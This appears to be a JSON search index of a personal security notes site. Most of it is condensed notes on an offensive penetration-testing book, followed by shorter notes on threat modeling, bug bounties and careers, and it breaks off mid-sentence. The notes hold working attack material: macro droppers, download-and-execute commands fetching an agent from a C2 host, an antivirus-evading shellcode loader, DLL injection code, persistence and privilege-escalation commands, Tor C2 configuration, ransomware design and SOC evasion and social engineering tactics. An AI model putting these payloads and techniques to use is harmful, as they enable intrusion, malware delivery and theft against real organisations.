Remote Access Trojans http://www.securityfocus.com/news/122 Simulating Advanced Persistent Threat Payload Delivery Part 1: Learning How to Use the VBA Macro Microsoft Office (2010 onward) the default behavior of the application is to make no distinction between signed and unsigned code How NOT to: msfvenom - p windows / download_exec - f vba - e shikata - ga - nai - i 5 - a x86 --platform Windows EXE=c:\\temp\\payload.exe URL=http://www.wherever.com functions being imported from kernel32.dll create a process thread allocate memory for the shellcode move the shellcode into that memory lot of virus scanners won\u2019t scan the declaration sec- tion, only the main body of code Instead of Private Declare PtrSafe Function CreateThread Lib kernel32 ( ByVal Zdz As Long , ByVal Tfnsv As Long , ByVal Kyfde As LongPtr , Spjyjr As Long , ByVal Pcxhytlle As Long , Coupxdxe As Long ) As LongPtr Declare Private Declare PtrSafe Function CreateThread Lib kernel32 Alias CTAlias ( ByVal Zdz As Long , ByVal Tfnsv As Long , ByVal Kyfde As LongPtr , Spjyjr As Long , ByVal Pcxhytlle As Long , Coupxdxe As Long ) As LongPtr And use CTAlias in body to bypass some AVs modern antivirus software is capable of passing compiled code (including shellcode) into a micro-virtual machine to test heuristically Do not leave shellcode like structures open Use of one auto-open subroutine is suspicious Sub Auto_Open Main block of code End Sub Sub AutoOpen () Auto_Open End Sub Sub Workbook_Open () Auto_Open End Sub native functions within VBA that allow an attacker to download and execute code from the Internet (these are detected) Shell URLDownLoadToFile Using a VBA/VBS Dual Stager VBA is only ever used within Office documents, VBS is a standalone scripting innocent-looking VBA macro that will carry a VBS payload, write it to file, and execute it Sub WritePayload () Dim PayLoadFile As Integer Dim FilePath As String FilePath = C: \\t emp\\payload.vbs PayloadFile = FreeFile Open FilePath For Output As TextFile Print # PayLoadFile , VBS Script Line 1 Print # PayLoadFile , VBS Script Line 2 Print # PayLoadFile , VBS Script Line 3 Print # PayLoadFile , VBS Script Line 4 Close PayloadFile Shell wscript c: \\t emp\\payload.vbs End Sub Code Obfuscation encode the lines of the payload as Base64 and decode them prior to writing them to the target file XOR function Social engineering imply that information has been sent to them in error it\u2019s something they shouldn\u2019t be seeing Something that would give them an advantage in some way Something that would put them at a disadvantage if they ignored it. Give the end user a compelling reason to enable macros. Tailor the attack to the client Powershell Sub powershell () Powershell Macro Dim PSResponse As String PSResponse = Shell ( PowerShell (New-Object System.Net.WebClient). DownloadFile( http://ourc2server.com/download/c2agent.exe , agent. exe ) ;Start-Process agent.exe , vbHide) End Sub FTP open ourc2server.com binary get /c2agent.exe quit cmd.exe /c @echo open ourc2server.com script.txt @echo binary script.txt @echo get /c2agent.exe script.txt @echo quit script.txt @ftp -s:scrip t.txt -v -A @start c2agent.exe Windows Scripting Host (WSH) strFileURL = http://ourc2server/downloads/c2agent.exe strHDLocation = agent.exe Set objXMLHTTP = CreateObject ( MSXML2.XMLHTTP ) objXMLHTTP . open GET , strFileURL , false objXMLHTTP . send () If objXMLHTTP . Status = 200 Then Set objADOStream = CreateObject ( ADODB.Stream ) objADOStream . Open objADOStream . Type = 1 objADOStream . Write objXMLHTTP . ResponseBody objADOStream . Position = 0 objADOStream . SaveToFile strHDLocation objADOStream . Close Set objADOStream = Nothing End if Set objXMLHTTP = Nothing Set objShell = CreateObject ( WScript.Shell ) objShell . Exec ( agent.exe ) cmd.exe /c @echo Set objXMLHTTP=CreateObject( MSXML2.XMLHTTP ) poc.vbs @echo objXMLHTTP.open GET , http://ourc2server/downloads/c2agent. exe ,false poc.vbs @ echo objXMLHTTP.send() poc.vbs @ echo If objXMLHTTP.Status=200 Then poc.vbs @ echo Set objADOStream=CreateObject( ADODB.Stream ) poc.vbs @ echo objADOStream.Open poc.vbs @ echo objADOStream.Type=1 poc.vbs @ echo objADOStream.Write objXMLHTTP.ResponseBody poc.vbs @ echo objADOStream.Position=0 poc.vbs @ echo objADOStream.SaveToFile agent.exe poc.vbs @ echo objADOStream.Close poc.vbs @ echo Set objADOStream=Nothing poc.vbs @ echo End if poc.vbs @ echo Set objXMLHTTP=Nothing poc.vbs @ echo Set objShell=CreateObject( WScript.Shell ) poc.vbs @ echo objShell.Exec( agent.exe ) poc.vbs cscript.exe poc.vbs BITSadmin: cmd . exe / c bitsadmin /transfer myjob /download /priority high http://ourc2server.com/download/c2agent.exe c:\\agent.exe start agent.exe Base64 encode: PS $b = [System.Text.Encoding] :: UTF8 . GetBytes ( PowerShell (N ew-Object System.Net.WebClient).DownloadFile( http://ourc2server.com/download/c2agent.exe , agent.exe );Start-Process agent.exe ) PS [System.Convert] :: ToBase64String ( $b ) Part 2: Using the Java Applet for Payload Delivery Java Code Signing completely unrealistic security model that lulls users into a false sense of security. Getting a signing cert: Register a domain name that is similar to an existing business Clone and host that website Change all phone contact information Consider a company well outside of the code signer\u2019s normal business area SMTP: https://tools.ietf.org/html/rfc6531 never use the same IPs for mail delivery and C2 Part 3: Physical Media official looking letter giving instructions to the target Target Location Profiling Create a list of ~100 and send a mail. Extract address from reply. installer such as InstallShield or Inno payloads are installed to somewhere they won\u2019t be found and executed, whereas our dummy application should be the thing that draws attention. (install with a desktop icon etc.) also drop the PowerView PowerShell script When hand delivering. Don\u2019t queue. official, appears to come from an official source, and seems mandatory Part 4: Client-Side Exploits 1 Flash exploits Part V: Simulating a Ransomware Attack could just be one component in a larger APT scenario Asymmetric cryptography only libgcrypt gcry_pk_encrypt \u2014Encrypt data using a public key. gcry_pk_decrypt \u2014Decrypt data using a private key. gcry_pk_genkey \u2014Create a new public/private key pair. Remote key generation C2 agent should send a request to the C2 server requesting that a private and a public key pair be generated Public key is then downloaded to the agent Configurable target specific file groups target local/network shares File operations enumerate all drives and scan them for files As each file is encrypted, its name should be added to a list somewhere original file should be destroyed through cryptographic scrubbing. secure-delete hashing and overwriting the file is one example of how this may be achieved encrypted file should be placed in the same directory notify generating a SHA hash of the public key providing that string as a reference when requesting payment ability to export the names of all encrypted files back to the C2 server Part VI: Deploying with HTA HTA Add icon to hta Part VII: USB Shotgun Attack Starting with Windows 7, the OS no longer supports the AutoRun functionality for non-optical removable media. AutoPlay will still work on CDs and DVDs (the user will be given the option to execute the code, but it won\u2019t happen automatically); however, it will no longer work at all for USB drives Part VIII: Miscellaneous Rich Web Content Java Web Start Adobe Air InDesign plugin Create a document and package all dependencies with the document Democratic People\u2019s Republic of Korea (DPRK) Democratic People\u2019s Republic of Korea (DPRK) - Red Star OS No root. Discretionary Access Control (DAC) provided by SE Linux Grant root by: rootsetting Stop SE Linux: setenforce 0 killall - 9 securityd Kill monitoring apps: killall scnprc killall opprc Phone system Needs entry through operator at +850 2 18111 (850 is the country code for DPRK and 2 is Pyongyang) Numbers that can dial internationally cannot dial locally War-dialing. VoIP calling to reduce cost. Record samples. Any tones that fall within a certain frequency we log as modems. Modem responses will contain the following tone DTMFs: 2250hz + 1625hz, 1850hz, 2000hz... WarVOX: https://github.com/rapid7/warvox Grab audio/video from android. If SSL site, permissions are requested only once. Command and Control Part 1: Basics and Essentials Essentials Egress connectivity Stealth fake the timestamp on the executable (show it was there for long time) Svchost.exe and spoolsv.exe make the best targets because there are usually several copies running in memory Remote file system access Remote command execution Secure communications Persistence Windows HKCU \\ Software \\ Microsoft \\ Windows \\ CurrentVersion \\ Run HKLM \\ Software \\ Microsoft \\ Windows NT \\ CurrentVersion \\ Image File Execution Options HKLM \\ Software \\ Wow6432Node \\ Windows NT \\ CurrentVersion \\ Image File Execution Options Services need to be specially compiled as a Windows service drop a DLL instead of an EXE and reference it from a Registry key using rundll32 rundll32 . exe javascript : \\..\\mshtml,RunHTMLApplication ; alert ( Boo! ); largest database of autorun methods: https://technet.microsoft.com/en-gb/sysinternals/bb963902.aspx Linux System V init On Older OSes Debian 6 and earlier Ubuntu 9.04 and earlier CentOS 5 and earlier Bash init script at / etc / init . d / service Then run sudo update - rc . d service enable This create a symlink in the runlevel directories 2 though 5 Add following to /etc/inittab: id : 2345 : respawn :/ bin /sh /path/to/application/s tartup sudo service service stop sudo service service start Upstart OSes Introduced: Ubuntu 6 Default in: Ubuntu 9.10 Red Hat Enterprise 6 Google Chrome OS Ubuntu 9.10 to Ubuntu 14.10 CentOS 6 systemd configuration script in / etc / init called servicename . conf Make sure it contains (runs on boot and will respawn if it dies): start on runlevel [ 2345 ] br respawn Create: / etc / systemd / system / multi - user . target . wants / service . service Should contain: Restart = always under [ Service ] section Start: sudo systemctl enable service . service cron init files /etc/profile /etc/profile.d/*.sh Graphical environments Rootkits: binary on the target system that has been replaced by malicious code yet retains the functionality of the original OSX cron first user-mode app to start is launchd . abusable by: echo bsexec 1 / bin / bash payload . script gt ; / etc / launchd . conf startup items place two items in a subdir within startup dir ( / System / Library / StartupItems or / Library / StartupItems ) StartupParameters . plist must contain Provides key containing name of script file name of the sub-directory must be the same as the name of the script file Port forwarding Control thread C2 Server SSH serving running on TCP port 443 Chroot jail to contain the SSH server Modified SSH configuration to permit remotely forwarded tunnels Payload (use libssh ) Implementation of SSH server on non-standard TCP port (ex: 900) Implementation of SSH client permitting connections back to C2 server Implementation of SSH tunnels (both local and dynamic) over the SSH client permitting C2 access to target file system and processes Part 2: Advanced Attack Management Stealth and Multiple System Management Beaconing : periodically call home (your C2 server) for orders rather than immediately establishing an SSH connection and reverse tunnel Pre-configured command set \u2014An established set of instructions Sleep (~60 seconds) OpenSSHTunnel SSH connection back to the C2 initiate a reverse tunnel allowing C2 to access the target\u2019s file system L22C900 Close SSHTunnel OpenTCPTunnel SSH connection back to the C2 and open a reverse tunnel to any port on the target for accessing local services LxxxCxxx CloseTCPTunnel OpenDynamic SSH connection back to the C2 and open both a dynamic tunnel and a reverse TCP tunnel pointing to it SOCKS5 proxy server CloseDynamic Task Download an executable from the web Tunnel management \u2014The C2 server needs to be able to handle multiple simultaneous inbound connections Web-based frontend Web server: tinyhttpd Scripting language: Python Database: PostgreSQL AJAX IPs, hostnames, etc ports are currently open which hosts they are assigned to function to periodically check the status of open tunnels and mark closed have a way to stack commands Part 3: Advanced Channels and Data Exfiltration ICMP packets were dropped is irrelevant: I can use DNS resolution itself as a means of command and control. dig + trace - using iterative querie sand following the referrals all the way communicate to our C2 via recursive DNS queries 1 st POC - Dan Kaminsky in 2004 with OzymanDNS dnscat2 sudo apt - get install ruby - dev https://github.com/iagox86/dnscat2.git ruby . / dnscat2 . rb anti - virus - update . com modifications to the C source to avoid detection ... listen [ 0000 :] 443 localhost : 443 to create a tunnel between you and remote 443 (then SSH to remote via tunnel) Part V: Creating a Covert C2 Solution Onion Router Routed through several layers of routers Each layer can only see its own upstream and downstream connections in any session and traffic is encrypted If attackers control the exit node, they can see the traffic going to its final destination correlation attacks that can be executed by major players (example NSA) identified by cross-referencing packets entering and leaving the Tor network C2 server can be provisioned as a node within the Tor network compromised host will connect to Tor when it comes online remaining operational access, even if compromised hosts are detected Impl Tor stores its configuration in a file called torrc To create a hidden service: # Configure hidden service directory Hidden ServiceeDir / home / wil / tor_hidden # C2 Web Port HiddenServicePort 443 127 . 0 . 0 . 1 : 4433 # C2 SSH Port HiddenServicePort 7022 127 . 0 . 0 . 1 : 7022 # C2 Metasploit listener HiddenServicePort 8080 127 . 0 . 0 . 1 : 8080 next time Tor is started, two files will be created in the tor_hidden directory private_key file hostname file that contains a hash of the public key address of your C2 Agent bundle the tor.exe (rename first) command-line application with the agent and simply execute it without parameters this will open a SOCKS proxy port on localhost 9050 Tell the SSH SOCKS proxy to upstream to the Tor SOCKS proxy on TCP 9050 Restrictions Some networks may block port TCP 9050 outbound or even dynamically blacklist all Tor nodes Tell C2 agent to use Tor bridges when connecting achieved by adding the following options to the local torrc configuration file (or command line args) Bridge fte 128 . 105 . 214 . 163 : 8080 A17A40775FBD2CA1184BF80BFC330A77ECF9D0E9 Bridge fte 192 . 240 . 101 . 106 : 80 FDC5BA65D93B6BCA5EBDF8EF8E4FA936B7F1F8E5 Bridge fte 128 . 105 . 214 . 162 : 8080 FC562097E1951DCC41B7D7F324D88157119BB56D Bridge fte 50 . 7 . 176 . 114 : 80 2 BD466989944867075E872310EBAD65BC88C8AEF Bridge fte 131 . 252 . 210 . 150 : 8080 0 E858AC201BF0F3FA3C462F64844CBFFC7297A42 Bridge fte 128 . 105 . 214 . 161 : 8080 1 E326AAFB3FCB515015250D8FCCC8E37F91A153B UseBridges 1 Part VI: The Creeper Box Using Raspberry Pi PoE (forensic analysis become hard) 3G/4G adapter ppp sakis3g Configuring Full-Disk Encryption (this involves lot of steps. Ref to book for details) Enable the SSH server change the MAC address (router/switch) configuring a fake Cisco telnet or SSH daemon bridge between between either a switch and a host or a switch and router bridge-utils Using a Pi as a Wireless AP to Provision Access by Remote Keyloggers Label that says \"Do not tamper\"with company logo. Part VII: Advanced Autonomous Data Exfiltration Physical Media Detect removable media Target data to exfiltrate packaged on to the drive Embedded into some pseudo-executable format (HTA) \"Hail Mary\" BlackHat: https://www.youtube.com/watch?v=nuruzFqMgIw USB act like a regular drive. When plugged in during boot, it act as a keyboard and a linux drive. Replace the bootloader with its own. Dropbox to bypass restrictions (Dropbox doesn't do malware checks) Email Use API when possible: example: Outlook API check if a domain has SPF protection (before spoofing) Wifi Connect the laptop via wireless to an AP that you control hidden feature in Windows that allows you to host your own AP while being simultaneously connected to another one with the same adapter (Internet Connection Sharing) netsh wlan set hostednetwork mode = allow ssid = C2backdoor key = password net start SharedAccess Mobile data / Bluetooth / SMS Dongle stealth installs the 3G/4G drivers silent install: setup_vmb . exe s / L2057 / v OPCO_PROP=23415 /qn /norestart establishes C2 (talk about adding a label that says: SIPDIS means it\u2019s for SIPRNet distribution and NOFORN means No Foreign Nationals ) Reciever will plug it to SIPRNet workstation to know what's inside Part VIII: Experimental Concepts in Command and Control C2 Server Guided Agent Management allow the C2 server to assign roles to the C2 agents one becomes master, others send data to master (master repaly to C2) have timeout and failover mechanisum HTTPS is not recommended for carrying C2 data outside the network Due to border level security May use ICMP, SNMP, fake RIP and OSPF messages Semi-Autonomous C2 Agent Management broadcast packet or a fake ARP packet can be used to enable nodes that are not aware of each other\u2019s presence elect a master The host with the most points becomes the new master points: Relative importance of the node (DC) Previous reliability of the node as noted by uptime Communication reliability in general (score decrease with every failure) Random jitter to avoid stagnation master responsible of monitoring slaves motify c2 if slave goes offline central conduit between the C2 server and the C2 slave nodes Correctly routing C2 messages to C2 slave nodes (c2 only say slave ID) should not be used for initiating a new election (that is reponsibility of all) The Attack Bypassing Authentication browser pivoting - transparently exploit his or her permissions DLL Injection - Inject code into the IE process migrate code between processes is a core skill in APT modeling process of inserting code into an existing (running) process use the LoadLibraryA () function in kernel32 . dll this function will register our DLL with the target process big antivirus no-no Better approach: Attach to the target process (in this case Internet Explorer). hHandle = OpenProcess ( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | Allocate memory within the target process. PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ , FALSE , procID ); GetFullPathName ( TEXT ( proxy.dll ), BUFSIZE , dllPath , NULL ); hFile = CreateFileA ( dllPath , GENERIC_READ , 0 , NULL , OPEN_EXISTING , FILE_ATTRIBUTE_NORMAL , NULL ); dllFileLength = GetFileSize ( hFile , NULL ); remoteDllAddr = VirtualAllocEx ( hProcess , NULL , dllFileLength , MEM_RESERVE | MEM_COMMIT , PAGE_EXECUTE_READWRITE ); Copy the DLL into the target process memory and calculate an appropriate memory addresses. lpBuffer = HeapAlloc ( GetProcessHeap (), 0 , dllFileLength ); ReadFile ( hFile , lpBuffer , dllFileLength , dwBytesRead , NULL ); WriteProcessMemory ( hProcess , lpRemoteLibraryBuffer , lpBuffer , dllFileLength , NULL ); dwReflectiveLoaderOffset = GetReflectiveLoaderOffset ( lpWriteBuff ); Instruct the target process to execute your DLL. rThread = CreateRemoteThread ( hTargetProcHandle , NULL , 0 , lpStartExecAddr , lpExecParam , 0 , NULL ); WaitForSingleObject ( rThread , INFINITE ); Create a web proxy Dynamic Link Library (DLL) based on the Microsoft WinInet API Internet Explorer uses the WinInet API exclusively for communication Inject proxy to intercept and read session finroamtion Pass web traffic through our SSH tunnel and the newly created proxy Situational Awareness ascertain exactly where you are in a target\u2019s network what privileges you have https://github.com/PowerShellEmpire/PowerTools : collection of PowerShell projects with a focus on offensive operations PowerView, can be used to query the AD in a number of ways c : powershell . exe - nop - exec bypass PS c : import - module .\\ powerview . ps1 PS c : Get - NetDomain | Out - File - Encoding ascii domains . txt PS c : Get - NetComputer - FullData | Out - File - encoding ascii machines . txt PS c : Get - NetUser - FullData | Out - File - encoding ascii users . txt FortiGate OS Version 4.8 sqlcmd - s medlab03 - SQL - u coll - domain / dgammon - p ILoveJustinBieber - q exec sp_databases sqlcmd - s medlab03 - SQL - u coll - domain / dgammon - p ILoveJustinBieber - Q BACKUP DATABASE perfuse_db TO DISK= C:\\perfuse_db.bak Get IPs of hosts: foreach ( $ computer in ( get - content C : \\ hosts . txt )) { Try { [ system . net . Dns ]:: GetHostAddresses ( $ computer ) | Foreach - Object { add - content - path C : \\ hosts - ips . txt - value $($_.IPAddressToString) } } Catch { } } Migration Process Checking if the meterpreter process has the SeDebugPrivilege Getting payload from the handler Calculating its length Calling the OpenProcess () API to gain access to the virtual memory of the target process. Calling the VirtualAllocEx () API to allocate an RWX (Read, Write, Execute) memory in the target process. Calling the WriteProcessMemory () API to write the payload in the target memory virtual memory space. Calling the CreateRemoteThread () API to execute the newly created memory stub having the injected payload in a new thread. Terminating the initial Meterpreter process. Uses migrate into the lsass . exe process and dump cached hashes without touching the disk Windows logon credentials, you must first inject into the winlogon . exe process After compromise Check if a domain-admin has signed into a machine where you have local-admin access to: PowerView Invoke - StealthUserhunter - GroupName Domain Admins Impersonate domain admin: meterpreter use incognito meterpreter getuid meterpreter list_tokens - u meterpreter impersonate_token PHARMA \\ globaladmin Search for files: dir \\\\ hostname \\ c $\\ * . xl * / s / b Personal Storage Table (. pst ) Offline Stored Table (. ost ) WMIC installer, which will allow us to invisibly deploy software remotely without any further user interaction: wmic / node :: @ c:\\computers.txt product call install true , , c:\\ PathToYour\\File.msi Credentials Decrypting the credential store copy the encrypted hashes re-create the login file or Registry entries locally let you access the applications they are intended to secure use a network sniffer (such as Wireshark) on your own machine to see the password transmitted in the clear Keyloggers and Cookies delete the cookies and force the users to log in: RunDll32 . exe InetCpl . cpl , ClearMyTracksByProcess 2 Chrome: Delete relevant file in: C : \\ Users \\ lt ; username gt ; \\ AppData \\ Local \\ Google \\ Chrome \\ User Data Windows Previlege Escalation Local exploit wmic qfe get Caption , Description , HotFixID , InstalledOn wmic qfe get Caption , Description , HotFixID , InstalledOn | findstr / C : KB2393802 https://github.com/GDSSecurity/Windows-Exploit-Suggester.git Flawed installation method sysprep . inf sysprep . xml unattended . xml Scheduled tasks schtasks / query / fo LIST / v schtasks / create / tn TaskName / tr TaskRun / sc onstart schtasks / create / tn TaskName / tr TaskRun / sc onlogon schtasks / create / tn TaskName / tr TaskRun / sc onidle / i { 1 - 999 } schtasks / create / tn TaskName / tr TaskRun / sc once / st HH : MM schtasks / create / tn TaskName / tr TaskRun / sc onlogon / ru System runs with system permissions schtasks / create / tn TaskName / tr TaskRun / sc onlogon / s PC_Name runs on a remote computer Vulnerable services net start sc qc VulnService accesschk . exe - ucqv VulnService sc config VulnPath binpath = C:\\temp\\c2agent.exe sc config VulnPath obj = .\\LocalSystem password = DLL hijacking DLL is loaded into the process space of the program calling it (becomes part of that program) DLL has no execution permissions of its own inherits permissions from the executable that imports it Recon: Which processes will load with elevated privileges Which DLLs you can overwrite with the privileges you have What DLLs are being imported by any given process Workflow: search processes: tasklist . exe / FI username eq system / v Dependency Walker to identify DLLs used icacls mmfs2 . dll to check permissions craft DLL (c++) #include windows.h #include stdio.h BOOL WINAPI DllMain ( HINSTANCE hinstDLL , DWORD fdwReason , LPVOID lpReserved ) { printf ( This string will be written to the console when this DLL is imported \\n ); break ; } Registry checks AlwaysInstallElevated CallerID VoIP vendors that allow outbound calling globally for low rates critically\u2014the option to set your own Caller ID and SMS number (CallWithUs) Detection and the Security Operations Center IDS Network Intrusion Detection System (NIDS) passive sniffing interfaces data directly from the switch (span, tap, or mirror port) don\u2019t hose network\u2019s core bandwidth Host-based Intrusion Detection System (HIDS) problems on end-points file integrity monitoring, rootkit checks, and Windows Registry checks. IDS monitors network traffic for malicious behavior, system log messages, and user activity. IDS Evasion AlienVault trial can be used to test understand its OTX (Open Threat eXchange) integration EventRisk = ( AssetValue \u00d7 EventPriority \u00d7 EventReliability ) / 25 asset with a low value and priority with a rule that is not considered to be sufficiently reliable is not going to get flagged aim to compromise endpoints that are going to have the lowest asset value (printer) Cisco router will likely be considered a high-value asset but monitoring usually has to be carefully tuned to avoid excess false positives A light port scan coming from a Cisco device will likely not be flagged or be immediately closed by the SOC team TCL scripting language in Cisco devices can be used to script an attack Security Operations Center (SOC) these are the people you have to beat in an APT modeling exercise Team: Shift manager \u2014 Responsible for handovers between shifts and associated duties (briefing status) First line SOC analysts \u2014 Working in shifts 24/7 monitoring the SIEM attack is detected, a ticket is raised and passed to the second line analysts Second line SOC analysts \u2014 Also available 24/7, although not necessarily on site determine if the ticket is a false positive or needs to be escalated to the third line analysts Third line SOC analysts \u2014 Technically available 24/7 depending on the nature of the incident serious ongoing security incident or \u201cactive shooter\u201d scenario final hour of a shift change in the early hours of the morning (3-4am) will likely be the time when the SOC reaction time is at its slowest Disrupt: Stage an attack on a different part Vulnerability scanners and brute force authentication attacks from multiple IPs Aim to put as many tickets between you and your attack AV Evading x86/shikata_ga_nai and XORing it with a simple key and use loader: #include windows.h #include iostream int main ( int argc , char ** argv ) { char b [] = { /* your XORd with key of xyz shellcode goes here*/ }; char c [ sizeof b ]; for ( int i = 0 ; i sizeof b ; i ++ ) { c [ i ] = b [ i ] ^ x ;} void * exec = VirtualAlloc ( 0 , sizeof c , MEM_COMMIT , PAGE_EXECUTE_ READWRITE ); memcpy ( exec , c , sizeof c ); (( void ( * )()) exec )(); } In agent code don't use words like Base64Decode (book uses monkey instead) Veil Evasion Social Engineering Fuzzy Fact (hand writing of name is not clesr, hence ask for help) Psychic Credit credit them with knowledge or experience they don\u2019t have treating the target as an equal and according them the respect of a peer \"I\u2019m normally not used to dealing with people who know what they\u2019re talking about\u2014this is a nice change!\" \"You\u2019re the expert so I was wondering if you could tell me....\" The Rainbow Ruse statement that credits the client with both a personality trait and its opposite irrefutable statement and that\u2019s social engineering gold Flattery / praising the concern / similar to the psychic credit, but is broader in its approach (\u201cYou\u2019re warm and loving.\u201d) \u201cI have to say I think your adherence to the essence of what security really is is spot on. Getting the balance right between functional process and security is never easy, but I think you\u2019ve really judged it well\u2014probably a bit better than most companies in your sector. At least in my experience.\u201d The Jacques Statement The Barnum Statement \u201csomething to please everybody.\u201d Statement is one that is designed to ring true to everyone","title":"Advanced Penetration Testing Hacking the World's Most Secure Networks"},{"location":"books/#threat-modeling-designing-for-security","text":"Threat modeling is the use of abstractions to aid in thinking about risks. Without threat models, you can never stop playing whack-a-mole Threat modeling should focus on issues that other techniques can\u2019t find \u201cThink Like an Attacker\u201d Considered Harmful thinking like a professional chef: Even if you\u2019re a great home cook, a restaurant-managing chef has to wrestle with problems that a home cook does not. you may end up with implicit or incorrect assumptions about how an attacker will think may lead you to focus on the wrong threats Reasons to Threat Model Find Security Bugs Early Understand Your Security Requirements Engineer and Deliver Better Products Address Issues Other Techniques Won\u2019t errors of omission (no code analysis tool will find) issues unique to your design Four step framework Model System - What are you building? Show trust boundaries Accounts (UIDs on unix systems, or SIDS on Windows) Network interfaces Different physical computers Virtual machines Organizational boundaries Almost anywhere you can argue for different privileges Find Threats - What can go wrong with it once it\u2019s built? Spoofing - pretending to be something or someone you\u2019re not. Someone might pretend to be another customer - authenticate users Someone might also pretend to be your website - SSL certificate and single domain Tampering - modifying something you\u2019re not supposed to modify. Data tampering at backend Data tampering during transit Someone deploy code thinking it's dev-env Angry programmer adding a discount code Repudiation - claiming you didn\u2019t do something (regardless of whether you did or not). Logs and log tampering prevention Information Disclosure - exposing information to people who are not authorized to see it. Can anyone connect to DB What happens if someone connect to DB Denial of Service - attacks designed to prevent a system from providing service What happens if 1000s of request come at same time Elevation of Privilege - program or user is able to do things that they\u2019re not supposed to do. What prevents users from connecting directly to the backend What controls access to DB Address Threats - What should you do about those things that can go wrong? Mitigating threats - doing things to make it harder to take advantage of a threat Eliminating threats - almost always achieved by eliminating features Transferring threats - letting someone or something else handle the risk Accepting the risk Validate - Did you do a decent job of analysis? Identifying Threats Start with external entities Never ignore a threat because it\u2019s not what you\u2019re looking for right now Focus on feasible threats","title":"Threat Modeling Designing for Security"},{"location":"bug-hunting/","text":"Bounty Programs ZERODIUM is the leading exploit acquisition platform for premium zero-days and advanced cybersecurity capabilities FedBounty - A Federally Sponsored National Bug Bounty Program Bounty Guides Subdomain takeover Hitchhiker\u2019s Guide to Bug Bounty Hunting Throughout the Galaxy. v2 by Nick Jenkins Guide to Responsible Disclosure and Bug Bounty Educational Content Connections Google Bughunter University BugCroud University Getting started in bugbounties Writeups Writeup Collections https://pentester.land/list-of-bug-bounty-writeups.html Facebook Disclosing page members Google writeups $7.5k Google Cloud Platform organization issue Techniques Static analysis of code involving user-input Look for unsafe usages of language features (check languages file) Look for movsx (sign extension vulnerability) Fuzzing The Art of Software Security Assessment: Identifying and Preventing Software Vulnerabilities (Addison- Wesley, 2007). Michael Sutton, Adam Greene, and Pedram Amini\u2019s Fuzzing: Brute Force Vulnerability Discovery (Addison-Wesley, 2007) Memory errors Using memory it does not own (e.g., NULL pointer dereferences) Using more memory than has been allocated (e.g., buffer overflows) Using uninitialized memory (e.g., uninitialized variables) Daniel Hodson, \u201cUninitialized Variables: Finding, Exploiting, Auto-mating\u201d (presentation, Ruxcon, 2008), http://felinemenace.org/~mercy/slides/RUXCON2008-UninitializedVariables.pdf Using faulty heap-memory management (e.g., double frees) Vulnerability Market Pedram Amini, \u201cMostrame la guita! Adventures in Buying Vulnerabili- ties,\u201d 2009, http://docs.google.com/present/view?id=dcc6wpsd_20ghbpjxcr Charlie Miller, \u201cThe Legitimate Vulnerability Market: Inside the Secretive World of 0-day Exploit Sales,\u201d 2007, http://weis2007.econinfosec.org/papers/29.pdf iDefense Labs Vulnerability Contribution Program, https://labs.idefense.com/vcpportal/login.html TippingPoint\u2019s Zero Day Initiative, http://www.zerodayinitiative.com/ .","title":"Bug hunting"},{"location":"bug-hunting/#bounty-programs","text":"ZERODIUM is the leading exploit acquisition platform for premium zero-days and advanced cybersecurity capabilities FedBounty - A Federally Sponsored National Bug Bounty Program","title":"Bounty Programs"},{"location":"bug-hunting/#bounty-guides","text":"Subdomain takeover Hitchhiker\u2019s Guide to Bug Bounty Hunting Throughout the Galaxy. v2 by Nick Jenkins Guide to Responsible Disclosure and Bug Bounty","title":"Bounty Guides"},{"location":"bug-hunting/#educational-content-connections","text":"Google Bughunter University BugCroud University Getting started in bugbounties","title":"Educational Content Connections"},{"location":"bug-hunting/#writeups","text":"","title":"Writeups"},{"location":"bug-hunting/#writeup-collections","text":"https://pentester.land/list-of-bug-bounty-writeups.html","title":"Writeup Collections"},{"location":"bug-hunting/#facebook","text":"Disclosing page members","title":"Facebook"},{"location":"bug-hunting/#google-writeups","text":"$7.5k Google Cloud Platform organization issue","title":"Google writeups"},{"location":"bug-hunting/#techniques","text":"Static analysis of code involving user-input Look for unsafe usages of language features (check languages file) Look for movsx (sign extension vulnerability) Fuzzing The Art of Software Security Assessment: Identifying and Preventing Software Vulnerabilities (Addison- Wesley, 2007). Michael Sutton, Adam Greene, and Pedram Amini\u2019s Fuzzing: Brute Force Vulnerability Discovery (Addison-Wesley, 2007) Memory errors Using memory it does not own (e.g., NULL pointer dereferences) Using more memory than has been allocated (e.g., buffer overflows) Using uninitialized memory (e.g., uninitialized variables) Daniel Hodson, \u201cUninitialized Variables: Finding, Exploiting, Auto-mating\u201d (presentation, Ruxcon, 2008), http://felinemenace.org/~mercy/slides/RUXCON2008-UninitializedVariables.pdf Using faulty heap-memory management (e.g., double frees)","title":"Techniques"},{"location":"bug-hunting/#vulnerability-market","text":"Pedram Amini, \u201cMostrame la guita! Adventures in Buying Vulnerabili- ties,\u201d 2009, http://docs.google.com/present/view?id=dcc6wpsd_20ghbpjxcr Charlie Miller, \u201cThe Legitimate Vulnerability Market: Inside the Secretive World of 0-day Exploit Sales,\u201d 2007, http://weis2007.econinfosec.org/papers/29.pdf iDefense Labs Vulnerability Contribution Program, https://labs.idefense.com/vcpportal/login.html TippingPoint\u2019s Zero Day Initiative, http://www.zerodayinitiative.com/ .","title":"Vulnerability Market"},{"location":"career/","text":"References We Need to Kill the \u2018Security Analyst\u2019: https://medium.com/@LargeCardinal/we-need-to-kill-the-security-analyst-79ec205651f5 Preparing for a Tech Talk, Part 1: Motivation: https://overreacted.io/preparing-for-tech-talk-part-1-motivation/ Preparing for a Tech Talk, Part 2: What, Why, and How: https://overreacted.io/preparing-for-tech-talk-part-2-what-why-and-how/ My first experience as speaker at Voxxed Days 2018: a talk about React, React Native and Typescript: https://www.fabrizioduroni.it/2018/11/01/react-native-typescript-conference-voxxed-2018.html 10 Personal Finance Lessons for Technology Professionals: https://www.troyhunt.com/10-personal-finance-lessons-for-technology-professionals/ Quotes The real pros ask the real questions : 1 ) If 2 ) When 3 ) Why 4 ) What 5 ) How much have you got 6 ) Have you got it 7 ) Do you get it 8 ) If so , how often 9 ) Which do you choose , a hard or soft option 10 ) How much do you need ? C-Level Position security as sales enablement Security needed to reduce sales cycle (align with business requirements) Evaluate security risks in context of business risk (holistic) Process vs problem Jobs Hunting https://www.linkedin.com/posts/jasonsblanchard_job-hunting-slides-from-webcast-521-activity-6669260088525508608-zvRe Identify the code that you do and build an elevated statement about you. Example: https://www.linkedin.com/in/jasonsblanchard/ Think about what people pay you to do. (I break things to improve them... I protect companies from 